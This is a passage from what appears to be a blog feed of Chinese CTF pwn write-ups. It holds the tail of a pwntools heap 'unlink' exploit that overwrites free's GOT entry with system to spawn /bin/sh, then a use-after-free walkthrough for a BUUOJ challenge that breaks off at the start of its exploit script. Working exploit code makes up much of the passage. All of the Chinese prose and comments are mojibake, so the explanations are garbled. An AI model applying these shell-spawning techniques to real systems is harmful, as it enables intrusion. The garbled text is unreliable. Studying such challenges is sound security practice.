punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the length of item name:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>length<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the new name of the item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>    r<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>context<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre></pre></td></tr><tr><td data-num=\"45\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Your choice:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token string\">b\"4\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>    r<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">\"Please enter the index of item:\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>    r<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">exit</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>\tsa<span class=\"token punctuation\">(</span><span class=\"token string\">'Your choice:'</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'a'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x80</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'b'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'c'</span> <span class=\"token operator\">*</span> <span class=\"token number\">8</span><span class=\"token punctuation\">)</span><span class=\"token comment\"># To stop merging chunk</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>add_item<span class=\"token punctuation\">(</span><span class=\"token number\">0x20</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'/bin/sh\\x00'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>ptr<span class=\"token operator\">=</span><span class=\"token number\">0x6020c8</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>fd<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>bk<span class=\"token operator\">=</span>ptr<span class=\"token operator\">-</span><span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"62\"></td><td><pre></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>fake_chunk<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x41</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span>bk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span><span class=\"token string\">b'\\x00'</span><span class=\"token operator\">*</span><span class=\"token number\">0x20</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre>fake_chunk<span class=\"token operator\">+=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x90</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"70\"></td><td><pre></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>fake_chunk<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre>free_got<span class=\"token operator\">=</span>elf<span class=\"token punctuation\">.</span>got<span class=\"token punctuation\">[</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"75\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_got:%x\"</span><span class=\"token punctuation\">,</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre>payload<span class=\"token operator\">=</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>free_got<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre></pre></td></tr><tr><td data-num=\"78\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>fake_chunk<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>payload<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"79\"></td><td><pre></pre></td></tr><tr><td data-num=\"80\"></td><td><pre></pre></td></tr><tr><td data-num=\"81\"></td><td><pre>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre></pre></td></tr><tr><td data-num=\"83\"></td><td><pre>free_addr<span class=\"token operator\">=</span>lic<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"84\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"free_addr:%x\"</span><span class=\"token operator\">%</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>libc<span class=\"token operator\">=</span>LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">,</span>free_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>libc_base<span class=\"token operator\">=</span>free_addr<span class=\"token operator\">-</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'free'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"libc_addr:%x\"</span><span class=\"token punctuation\">,</span>libc_base<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>system_addr<span class=\"token operator\">=</span>libc_base<span class=\"token operator\">+</span>libc<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>log<span class=\"token punctuation\">.</span>info<span class=\"token punctuation\">(</span><span class=\"token string\">\"system_addr:%x\"</span><span class=\"token punctuation\">,</span>system_addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>edit<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">,</span>p64<span class=\"token punctuation\">(</span>system_addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#ÊîπÂÜô got Ë°®ÂÜÖÂÆπ</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre>it<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/unlinkpic/image-20230811135415349.png\" alt=\"image-20230811135415349\"></p>\n<h3 id=\"ÊÄªÁªì\"><a class=\"markdownIt-Anchor\" href=\"#ÊÄªÁªì\">#</a> ÊÄªÁªìÔºö</h3>\n<p>unlink ËøôÈáåÊØîËæÉÁöÑÁªïÔºåÂÖ∂ÂÆû‰∏çÈöæÔºå‰ΩÜÊòØÊòØÂéªÁêÜËß£ÊåáÈíàÁöÑÊåáÂêëÈúÄË¶ÅËä±Ë¥π‰∏ÄÁÇπÊó∂Èó¥ÔºåÁé∞Âú®ËøòÊòØ‰∏çÂ§™ÁÜüÁªÉÔºåË¶ÅÁªßÁª≠Âä†Ê≤π„ÄÇ</p>\n",
            "tags": [
                "Â†Ü",
                "unlink"
            ]
        },
        {
            "id": "http://example.com/2023/08/10/uaf/",
            "url": "http://example.com/2023/08/10/uaf/",
            "title": "uaf",
            "date_published": "2023-08-10T01:18:39.000Z",
            "content_html": "<h1 id=\"pwn-uaf‰∫ÜËß£Â≠¶‰π†\"><a class=\"markdownIt-Anchor\" href=\"#pwn-uaf‰∫ÜËß£Â≠¶‰π†\">#</a> PWN uaf ‰∫ÜËß£Â≠¶‰π†</h1>\n<p>ÂàöÂàöÊé•Ëß¶Â†ÜÔºåÂèëÁé∞Âú®ÁúãÈ¢òÁöÑÊó∂ÂÄôÔºåÂØπ‰∏é C ËØ≠Ë®ÄË¶ÅÊ±ÇËøòÊå∫È´òÔºåÈúÄË¶Å‰∫ÜËß£ÊåáÈíàÊòØÊÄé‰πà‰∏ÄÂõû‰∫ã„ÄÇÊâÄ‰ª•ÊàëÂÜ≥ÂÆöÔºå‰∏ãÈù¢‰∏ÄÈÅì‰æãÈ¢òË¶ÅÂ•ΩÂ•ΩÂàÜÊûêÊ∫ê‰ª£Á†ÅÔºå‰∫ÜËß£ÂêÑ‰∏™ÂáΩÊï∞Ë∞ÉÁî®ÁöÑÊÑè‰πâ„ÄÇ</p>\n<h2 id=\"È¶ñÂÖàÂÖàÂ£∞Êòé‰∏Ä‰∏ã‰ªÄ‰πàÂè´uaf\"><a class=\"markdownIt-Anchor\" href=\"#È¶ñÂÖàÂÖàÂ£∞Êòé‰∏Ä‰∏ã‰ªÄ‰πàÂè´uaf\">#</a> È¶ñÂÖàÂÖàÂ£∞Êòé‰∏Ä‰∏ã‰ªÄ‰πàÂè´ uafÔºö</h2>\n<p>ÂèÇËÄÉ<span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8=\"> ctfwiki</span></p>\n<p>ÂéüÁêÜ <span class=\"exturl\" data-url=\"aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L3VzZXItbW9kZS9oZWFwL3B0bWFsbG9jMi91c2UtYWZ0ZXItZnJlZS8jXzE=\">¬∂</span></p>\n<p>ÁÆÄÂçïÁöÑËØ¥ÔºåUse After Free Â∞±ÊòØÂÖ∂Â≠óÈù¢ÊâÄË°®ËææÁöÑÊÑèÊÄùÔºåÂΩì‰∏Ä‰∏™ÂÜÖÂ≠òÂùóË¢´ÈáäÊîæ‰πãÂêéÂÜçÊ¨°Ë¢´‰ΩøÁî®„ÄÇ‰ΩÜÊòØÂÖ∂ÂÆûËøôÈáåÊúâ‰ª•‰∏ãÂá†ÁßçÊÉÖÂÜµ</p>\n<ul>\n<li>ÂÜÖÂ≠òÂùóË¢´ÈáäÊîæÂêéÔºåÂÖ∂ÂØπÂ∫îÁöÑÊåáÈíàË¢´ËÆæÁΩÆ‰∏∫ NULL Ôºå ÁÑ∂ÂêéÂÜçÊ¨°‰ΩøÁî®ÔºåËá™ÁÑ∂Á®ãÂ∫è‰ºöÂ¥©Ê∫É„ÄÇ</li>\n<li>ÂÜÖÂ≠òÂùóË¢´ÈáäÊîæÂêéÔºåÂÖ∂ÂØπÂ∫îÁöÑÊåáÈíàÊ≤°ÊúâË¢´ËÆæÁΩÆ‰∏∫ NULL ÔºåÁÑ∂ÂêéÂú®ÂÆÉ‰∏ã‰∏ÄÊ¨°Ë¢´‰ΩøÁî®‰πãÂâçÔºåÊ≤°Êúâ‰ª£Á†ÅÂØπËøôÂùóÂÜÖÂ≠òÂùóËøõË°å‰øÆÊîπÔºåÈÇ£‰πà<strong>Á®ãÂ∫èÂæàÊúâÂèØËÉΩÂèØ‰ª•Ê≠£Â∏∏ËøêËΩ¨</strong>„ÄÇ</li>\n<li>ÂÜÖÂ≠òÂùóË¢´ÈáäÊîæÂêéÔºåÂÖ∂ÂØπÂ∫îÁöÑÊåáÈíàÊ≤°ÊúâË¢´ËÆæÁΩÆ‰∏∫ NULLÔºå‰ΩÜÊòØÂú®ÂÆÉ‰∏ã‰∏ÄÊ¨°‰ΩøÁî®‰πãÂâçÔºåÊúâ‰ª£Á†ÅÂØπËøôÂùóÂÜÖÂ≠òËøõË°å‰∫Ü‰øÆÊîπÔºåÈÇ£‰πàÂΩìÁ®ãÂ∫èÂÜçÊ¨°‰ΩøÁî®ËøôÂùóÂÜÖÂ≠òÊó∂Ôºå<strong>Â∞±ÂæàÊúâÂèØËÉΩ‰ºöÂá∫Áé∞Â•áÊÄ™ÁöÑÈóÆÈ¢ò</strong>„ÄÇ</li>\n</ul>\n<p>ËÄåÊàë‰ª¨‰∏ÄËà¨ÊâÄÊåáÁöÑ <strong>Use After Free</strong> ÊºèÊ¥û‰∏ªË¶ÅÊòØÂêé‰∏§Áßç„ÄÇÊ≠§Â§ñÔºå<strong>Êàë‰ª¨‰∏ÄËà¨Áß∞Ë¢´ÈáäÊîæÂêéÊ≤°ÊúâË¢´ËÆæÁΩÆ‰∏∫ NULL ÁöÑÂÜÖÂ≠òÊåáÈíà‰∏∫ dangling pointer„ÄÇ</strong></p>\n<p><em>ÈÄöËøá‰∫ÜËß£‰∫ÜÂéüÁêÜÔºåÊàë‰ª¨ÂèëÁé∞ uaf ÊòØÁî±‰∫é‰ΩøÁî®ÂêéÂÜçÊ¨° free Ê≤°ÊúâÂéªÁΩÆÁ©∫ÊåáÈíàÔºåÂØºËá¥‰∏ã‰∏ÄÊ¨°Ë¢´‰ΩøÁî®Á®ãÂ∫è‰ºöÂÜçÊ¨°Âà∞ÊåáÈíàÊâÄÊåáÂêëÁöÑÂÜÖÂÆπ„ÄÇ</em></p>\n<p>Êé•‰∏ãÊù•Êàë‰ª¨ÈÄöËøá‰∏ÄÈÅì‰æãÈ¢òÂéª‰∫ÜËß£‰∏Ä‰∏ã uaf ÊºèÊ¥ûÁöÑÂà©Áî®„ÄÇ</p>\n<h3 id=\"È¢òÁõÆÊù•Ê∫ê\"><a class=\"markdownIt-Anchor\" href=\"#È¢òÁõÆÊù•Ê∫ê\">#</a> <span class=\"exturl\" data-url=\"aHR0cHM6Ly9idXVvai5jbi9jaGFsbGVuZ2VzI2FjdGZfMjAxOV9iYWJ5aGVhcA==\">È¢òÁõÆÊù•Ê∫ê</span></h3>\n<h4 id=\"È¶ñÂÖàÊ£ÄÊü•Á®ãÂ∫è‰øùÊä§Êé™ÊñΩ\"><a class=\"markdownIt-Anchor\" href=\"#È¶ñÂÖàÊ£ÄÊü•Á®ãÂ∫è‰øùÊä§Êé™ÊñΩ\">#</a> È¶ñÂÖàÊ£ÄÊü•Á®ãÂ∫è‰øùÊä§Êé™ÊñΩÔºö</h4>\n<p><img data-src=\"/img/uafpic/image-20230810073539360.png\" alt=\"image-20230810073539360\"></p>\n<p>Âì¶ÔºåÂØπ‰∫Ü„ÄÇËøôÈáå‰∏∫Âï• runpath ÁöÑË∑ØÂæÑÊòØÊàëÊú¨Âú∞ÁöÑÂéüÂõ†ÊòØÔºåÊàëÁî® patchelf Êîπ‰∫ÜÔºåÂ∞Ü‰ªñÂèòÊàê ubuntu16.04 ÁâàÊú¨ÁöÑ glibcÔºå‰∏∫‰∫ÜÂéª‰∫ÜËß£‰∏Ä‰∏ã fastbins ÁöÑ‰ΩúÁî®ÔºàÂÖ∂ÂÆû‰∏çÁî®Êîπ‰πüÂèØ‰ª•ÔºåÂú®Ë∞ÉËØï 18.04 ÁöÑ glibc ÁâàÊú¨ÔºåÂèëÁé∞ÂÖ∂ÂÆûÂèòÂåñ‰∏çÂ§ß„ÄÇ</p>\n<h4 id=\"ËøêË°åÁ®ãÂ∫èÂéª‰∫ÜËß£ÂäüËÉΩ\"><a class=\"markdownIt-Anchor\" href=\"#ËøêË°åÁ®ãÂ∫èÂéª‰∫ÜËß£ÂäüËÉΩ\">#</a> ËøêË°åÁ®ãÂ∫èÔºåÂéª‰∫ÜËß£ÂäüËÉΩÔºö</h4>\n<p>ËøêË°åÁ®ãÂ∫èÔºåÂèëÁé∞ menuÔºåÊúâ 4 ‰∏™ node„ÄÇ</p>\n<p><img data-src=\"/img/uafpic/image-20230810073909996.png\" alt=\"image-20230810073909996\"></p>\n<ol>\n<li>ÈÄâÊã© Create something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074007769.png\" alt=\"image-20230810074007769\"></p>\n<ol start=\"2\">\n<li>ÈÄâÊã© Print something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074030177.png\" alt=\"image-20230810074030177\"></p>\n<ol start=\"3\">\n<li>ÈÄâÊã© Delete something, ‰πãÂêéÂú® Print something</li>\n</ol>\n<p><img data-src=\"/img/uafpic/image-20230810074149061.png\" alt=\"image-20230810074149061\"></p>\n<p>Ëøô‰πüÂ∞±ÊòØËøôÁ®ãÂ∫èÁöÑ‰∏ªË¶ÅÂäüËÉΩ‰∫Ü„ÄÇ</p>\n<h4 id=\"ÊîæÂÖ•idaËøõË°åÂáΩÊï∞ÂàÜÊûê\"><a class=\"markdownIt-Anchor\" href=\"#ÊîæÂÖ•idaËøõË°åÂáΩÊï∞ÂàÜÊûê\">#</a> ÊîæÂÖ• IDAÔºåËøõË°åÂáΩÊï∞ÂàÜÊûêÔºö</h4>\n<blockquote>\n<ul>\n<li>\n<p>main ÂáΩÊï∞:</p>\n<p>Ê≤°‰ªÄ‰πàÂ•ΩËÆ≤ÁöÑÔºå‰∏ªË¶ÅÊòØÂéªË∞ÉÁî®ÂáΩÊï∞ÂäüËÉΩ„ÄÇ</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810075032398.png\" alt=\"image-20230810075032398\"></p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>add ÂáΩÊï∞Ôºö</p>\n<p>Ëøô‰∏Ä‰∏™ node ÂèØ‰ª•ÁúãËßÅ‰ºöÁî≥ËØ∑‰∏§Ê¨°Â†ÜÁ©∫Èó¥ÔºåÁ¨¨‰∏ÄÊ¨°ÊòØ 0x10 ÁöÑÔºåÁ¨¨‰∫åÊ¨°ÊòØÊàë‰ª¨ËæìÂÖ•ÁöÑ</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810080910781.png\" alt=\"image-20230810080910781\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810081834751.png\" alt=\"image-20230810081834751\"></p>\n<p>ËøôÂ∞±ÊòØ add ÂêéÁöÑ chunkÔºå‰ΩÜÊòØ‰∏∫Âï•Á¨¨‰∏Ä‰∏™ÂùóÂÜÖÂ≠òÊúâ‰∏™Âú∞ÊñπÊàëÊ≤°Ê†áÊ≥®ÂÜÖÂÆπÔºåÂõ†‰∏∫ÊàëÊöÇÊó∂‰∏çÁü•ÈÅì„ÄÇ‰ΩÜÊòØÊàëÂêéÊúüË∞ÉËØïÂèëÁé∞Â∫îËØ•ÊòØÂ≠óÁ¨¶‰∏≤ÁöÑÂú∞ÂùÄ„ÄÇ</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>delete ÂáΩÊï∞Ôºö</p>\n<p>delete ‰ºöÊ†πÊçÆÁªôÂÆöÁöÑÁ¥¢ÂºïÊù•ÈáäÊîæÂØπÂ∫îÁöÑ note„ÄÇ‰ΩÜÊòØÂÄºÂæóÊ≥®ÊÑèÁöÑÊòØÔºåÂú®Âà†Èô§ÁöÑÊó∂ÂÄôÔºåÂè™ÊòØÂçïÁ∫ØËøõË°å‰∫Ü freeÔºåËÄåÊ≤°ÊúâËÆæÁΩÆ‰∏∫ NULLÔºåÈÇ£‰πàÊòæÁÑ∂ÔºåËøôÈáåÊòØÂ≠òÂú® Use After Free ÁöÑÊÉÖÂÜµÁöÑ„ÄÇ</p>\n</li>\n</ul>\n<p><img data-src=\"/img/uafpic/image-20230810083828105.png\" alt=\"image-20230810083828105\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810084236274.png\" alt=\"image-20230810084236274\"></p>\n<p><img data-src=\"/img/uafpic/image-20230810084217308.png\" alt=\"image-20230810084217308\"></p>\n<p>ÊâÄ‰ª•ËøôÈáåÊàë‰ª¨Âà©Áî® uafÔºåÂéªÁî≥ËØ∑ 0x10 Â§ßÂ∞èÁöÑÁ©∫Èó¥ÔºåÂéªË¶ÜÂÜôÂ†ÜÁöÑÊåáÈíàÂç≥ÂèØÔºà‰∏∫‰ΩïÂéªÁî≥ËØ∑ 0x10 Âë¢ÔºåÊàëÁöÑÁêÜËß£Â∞±ÊòØÔºåÂéªÁî≥ËØ∑ fastbins ÈáåÈù¢Áõ∏ÂêåÂ§ßÂ∞èÁöÑ chunkÔºå‰æø‰∫éÂÜçÊ¨°Âà©Áî®ÊåáÈíàÁöÑ‰ΩúÁî®Ôºå‰ªéËÄåÊéßÂà∂Á®ãÂ∫èÁöÑÊéßÂà∂ÊµÅ„ÄÇÔºâ</p>\n</blockquote>\n<blockquote>\n<ul>\n<li>\n<p>show ÂáΩÊï∞Ôºö</p>\n<p>ËøôÈáåÈù¢ÂîØ‰∏ÄÁöÑÈáçÁÇπÂ∞±ÊòØÈÇ£‰∏™Ê≥®ÈáäÔºåÂõ†‰∏∫ÈÄöËøáËøôÈáåÔºåÂéªÊâßË°åËøô‰∏™ÂáΩÊï∞ÔºåÂ∞±ËÉΩÂÆûÁé∞ÊéßÂà∂„ÄÇÊØîÂ¶Ç ptr [1] Â§ÑÊòØ system ÂáΩÊï∞ÁöÑÂú∞ÂùÄÔºåprt [[0] Â§ÑÊòØ binsh Â≠óÁ¨¶‰∏≤ÁöÑÂú∞ÂùÄÔºåÈÇ£Êàë‰ª¨Â∞±ËÉΩÂÆûÁé∞ system (‚Äô/bin/sh‚Äô) ÁöÑ‰ΩúÁî®„ÄÇ</p>\n<p><img data-src=\"/img/uafpic/image-20230810085041491.png\" alt=\"image-20230810085041491\"></p>\n</li>\n</ul>\n</blockquote>\n<blockquote>\n<p>Êé•‰∏ãÊù•ÊòØÊºèÊ¥ûÂà©Áî®ËøáÁ®ãÔºö<br>\nÁî≥ËØ∑ note0ÔºàÂ§ßÂ∞è‰∏∫ 0x40ÔºâÔºöÂåÖÊã¨ put0 Âíå content0<br>\n Áî≥ËØ∑ note1 (Â§ßÂ∞è‰∏∫ 0x40) ÔºöÂåÖÊã¨ put1 Âíå content1<br>\n ÈáäÊîæ note0ÔºöÂåÖÊã¨ free content0 Âíå free put0<br>\n ÈáäÊîæ note1ÔºöÂåÖÊã¨ free content1 Âíå free put1</p>\n</blockquote>\n<p>Áî±‰∫é put ÊÆµË∑ü content ÊÆµÁöÑÂ§ßÂ∞èÊòØ‰∏çÂêåÁöÑÔºåÊâÄ‰ª•‰ªñ‰ª¨ÊòØÂú® bin ÈáåÈù¢ÊòØ‰∏§Êù°ÈìæÔºöÂ¶ÇÊûú‰Ω†Áî≥ËØ∑ÁöÑ chunk Â§ßÂ∞èÊòØ 0x10ÔºåÈÇ£‰πàÊòØ‰ªé put ÁöÑÈÇ£Êù°ÈìæÁî≥ËØ∑„ÄÇÂ¶ÇÊûú‰Ω†Áî≥ËØ∑ÁöÑ chunk Â§ßÂ∞èÊòØ 0x20ÔºåÈÇ£‰πàÂ∞±ÊòØ‰ªé content ÁöÑÈÇ£Êù°ÈìæÁî≥ËØ∑„ÄÇ</p>\n<p>ÊâÄ‰ª•Êàë‰ª¨ÂÜçÊ¨°Áî≥ËØ∑Ë¶ÅÂéªÁî≥ËØ∑ 0x10 Â§ßÂ∞è</p>\n<p>Áî≥ËØ∑ note2ÔºàÂ§ßÂ∞è‰∏∫ 0x10ÔºâÔºöÂàô‰ºöÁî≥ËØ∑‰∏Ä‰∏™ put2 ‰∏Ä‰∏™ content2. Áî±‰∫é put2 Âíå content2 Â§ßÂ∞èÈÉΩ‰∏∫ 0x10ÔºåÊâÄ‰ª•ÈÉΩ‰ºö‰ªé put ÈÇ£Êù°Èìæ‰∏äÈù¢Áî≥ËØ∑„ÄÇ<br>\nÊâÄ‰ª•Ôºåput2 Áî≥ËØ∑Âà∞ÁöÑÊòØ put0 ÁöÑ‰ΩçÁΩÆÔºåcontent2 Áî≥ËØ∑Âà∞ÁöÑÊòØ put1 ÁöÑ‰ΩçÁΩÆ„ÄÇ</p>\n<p>ÂæàÊòéÊòæ‰∫ÜÔºåÊàë‰ª¨ÂæÄ content2 ÈáåÈù¢Â°´ÂÖ• system ÁöÑÂú∞ÂùÄÂíå binsh Âú∞ÂùÄÔºå‰∏çÂ∞±Áõ∏ÂΩì‰∫éÂæÄ note0 ÁöÑ put0 ÈáåÂ°´ÂÖ•‰∫Ü system Âíå binshÔºü<br>\nÈÇ£‰πàÊàë‰ª¨Âú®Ë∞ÉÁî® show (0) ÁöÑÊó∂ÂÄôÔºå‰∏çÂ∞±ÊòØË∞ÉÁî®‰∫Ü system ÂáΩÊï∞ÂêóÔºü</p>\n<blockquote>\n<p>‰∏∫‰∫ÜÊõ¥Âä†È´òÊïàÂú∞Âà©Áî® fast binÔºåglibc ÈááÁî®ÂçïÂêëÈìæË°®ÂØπÂÖ∂‰∏≠ÁöÑÊØè‰∏™ bin ËøõË°åÁªÑÁªáÔºåÂπ∂‰∏î<strong>ÊØè‰∏™ bin ÈááÂèñ LIFO Á≠ñÁï•</strong></p>\n</blockquote>\n<h4 id=\"ÊâÄ‰ª•exp‰∏∫\"><a class=\"markdownIt-Anchor\" href=\"#ÊâÄ‰ª•exp‰∏∫\">#</a> ÊâÄ‰ª• exp ‰∏∫Ôºö</h4>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span>os<span class=\"token operator\">=</span><span class=\"token string\">'linux'</span><span class=\"token punctuation\">,</span>log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>r <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29844</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># r = 